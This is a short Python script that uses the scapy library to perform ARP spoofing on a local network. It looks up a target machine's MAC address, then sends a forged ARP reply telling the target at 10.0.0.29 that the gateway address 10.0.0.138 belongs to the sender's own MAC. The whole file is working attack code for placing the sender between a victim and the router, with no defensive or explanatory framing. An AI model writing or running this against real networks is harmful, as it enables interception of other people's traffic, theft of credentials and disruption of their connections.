import scapy.all as scapy
ip = "10.0.0.138"
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)    

    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    arp_request_broadcast = broadcast / arp_request


    answered_list = scapy.srp(arp_request_broadcast, timeout =1, verbose =False)[0]

    target_mac = answered_list[0][1].hwsrc
    return target_mac


def own_mac():
    # my mac addr
    return scapy.get_if_hwaddr(scapy.conf.iface)


# the computer ip target is- target ip
# the deafult gateaway ip is- spoof_ip

# hwdst
def arp_spoofing(target_ip, spoof_ip):
    arp_response_packet = scapy.ARP(op=2,  # Create an ARP packet with operation set to 2 (ARP reply).
                       pdst=target_ip, # the target computer dst ip
                       hwdst =get_mac(target_ip),  # dest mac to computer target
                       
                       psrc =spoof_ip,  # Set the source IP to rauters ip
                       hwsrc =own_mac())  # Set the source MAC addr to my mac
    scapy.send(arp_response_packet, verbose=False) 


target_ip = "10.0.0.29"

spoof_ip = "10.0.0.138"


arp_spoofing(target_ip, spoof_ip)